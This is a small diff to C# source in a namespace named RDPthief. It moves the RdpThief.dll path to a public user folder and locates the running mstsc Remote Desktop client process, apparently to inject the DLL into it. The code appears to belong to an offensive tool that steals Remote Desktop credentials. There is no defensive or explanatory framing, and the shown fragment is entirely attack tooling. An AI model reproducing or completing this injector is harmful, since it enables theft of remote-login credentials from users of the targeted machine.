@@ -30,7 +30,7 @@ namespace RDPthief
         {
             // YOU NEED THE RDPTHIEF.dll!!!!!!! 
             // So modify the path to the dll also thank you
-            String dllName = "C:\\Tools\\RdpThief.dll";
+            String dllName = "C:\\Users\\Public\\RdpThief.dll";
             Process[] mstscProc = Process.GetProcessesByName("mstsc");
             int pid = mstscProc[0].Id;
 
